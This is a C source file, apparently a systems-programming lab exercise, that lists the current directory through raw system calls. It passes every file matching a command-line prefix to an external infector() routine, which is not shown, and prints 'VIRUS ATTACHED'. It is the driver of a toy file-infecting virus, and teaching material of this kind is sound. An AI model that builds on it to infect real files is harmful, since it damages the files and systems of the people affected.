#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define SYS_GETDENTS 141
#define SYS_EXIT 1
#define STDERR 2
#define O_RDONLY 0
#define O_WRONLY 1
#define SYS_CLOSE 6

extern int system_call();
extern void infection();
extern void infector(char *file);

typedef struct ent {
  int inode;
  int offset;
  short len;
  char name[];
} ent;


void printVirus() {
    system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", strlen(" VIRUS ATTACHED"));
    return;
}

void printError() {
    system_call(SYS_WRITE, STDOUT, " ERROR open virus file", strlen(" Error open virus file"));
    return;
}

int main (int argc, char* argv[], char* envp[]) {
    int fd, nread;
    int bytePos = 0;
    char buf[8192];
    ent *entp;
    char *prefix = "Null";
    int prefixLen = -1;

    if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'a') {
        prefix = argv[1];
        prefix = prefix + 2;
        prefixLen = strlen(prefix);
    }

    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        system_call(SYS_WRITE, STDERR, "Error SYS-OPEN", sizeof("Error SYS-OPEN"));
        system_call(SYS_EXIT, 0x55, 0, 0);
    }
    nread = system_call(SYS_GETDENTS, fd, buf, 8192);
    if (nread < 0) {
        system_call(SYS_WRITE, STDERR, "Error SYS-GETDENTS", sizeof("Error SYS-GETDENTS"));
        system_call(SYS_EXIT, 0x55, 0, 0);
    }
    for (bytePos = 0; bytePos < nread; bytePos = bytePos + entp->len) {
        entp = (ent *)(buf + bytePos);
        system_call(SYS_WRITE, STDOUT, entp->name, strlen(entp->name));
        if (prefixLen >= 0) {
            if (!strncmp(entp->name, prefix, prefixLen)) {
                /*infection();*/
                infector(entp->name);
            }
        }
        system_call(SYS_WRITE, STDOUT, "\n", strlen("\n"));  
    }
    system_call(SYS_CLOSE, fd, 0, 0);
    return 0;
}